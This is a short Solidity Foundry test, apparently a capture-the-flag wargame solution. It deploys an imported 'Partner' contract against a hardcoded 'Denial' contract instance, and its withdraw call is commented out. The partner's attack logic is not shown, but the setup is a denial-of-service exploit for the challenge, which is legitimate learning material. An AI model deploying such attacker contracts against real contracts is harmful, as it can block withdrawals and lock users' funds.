// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Denial} from "../instances/Ilevel20.sol";
import {Partner} from "../src/level20.sol";

contract Attacker is Test {
    Denial level20 = Denial(payable(0x2e4ec2227E720790dCF77341AeF87Ee3967483D7));

    function test() external {
        new Partner(payable(address(level20)));

        // AFAIK, there is no way to cap gas in a Forge test.
        // vm.expectRevert();
        // level20.withdraw();
    }
}
